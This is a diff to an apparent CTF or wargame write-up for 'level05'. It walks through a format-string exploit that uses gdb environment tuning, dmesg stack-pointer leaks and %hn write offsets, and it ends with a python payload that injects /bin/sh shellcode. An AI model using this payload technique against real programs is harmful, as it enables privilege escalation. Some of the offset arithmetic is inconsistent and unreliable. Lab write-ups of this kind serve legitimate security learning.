@@ -122,21 +122,45 @@ unset env LINES
 unset env COLUMNS
 ```
 
-0xffffddcb
-
+Also make sure to launch gdb with env - gdb /home/users/level05 -- this way the environment (environment pointer, argc/argv etc.) will be as close as possible to the runtime environment.
+We're aiming at an address on the stack, so we need our addresses to be dialed in on the real addresses / stack pointer.
 
 the shellcode now lives at 0xffffd67f. We need to tweak the first printf inflation value:
 
-0xffffd69d
+value1 = 0xd69d - 8 = 54903
 
-value1 = 0xd69d - 8 = 54901
-1
-value2 = 0xffff - 0xd69d = 10594
+value2 = 0xffff - 0xd69d = 10624
 
-## Final result, I promise
+## Go back to the world of hurt
 
-56802
+The resulting shellcode still doesn't work. We're noticing that the code segfaults.
 
-8725
+We figure out that the kernel writes segfault messages here:
 
-python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%54879x%10$hn%10596x%11$hn\x00" + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5
+```
+dmesg
+```
+
+The kernel also prints out the real stack pointer!
+
+```
+[ 1001.641233] level05[1869]: segfault at b ip 00000000ffffde09 sp 00000000ffffddbc error 6
+```
+
+We know the address we want to jump to is at $esp + 0x27 + 36 (for our formatting directives etc).
+
+```python3
+>>> hex(0xffffddbc + 0x4a)
+'0xffffde06'
+```
+
+Now redirect the exploit to this address
+
+## Still doesn't work
+
+It looks like we're close. We've tried adding 1-3 bytes and it finally worked!
+
+
+## The final payload
+
+python -c 'import struct;print(struct.pack("I", 0x080497e0) + struct.pack("I", 0x080497e2) + "%56830x%10$hn%8697x%11$hn\x00" +  "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80")' > /tmp/e5
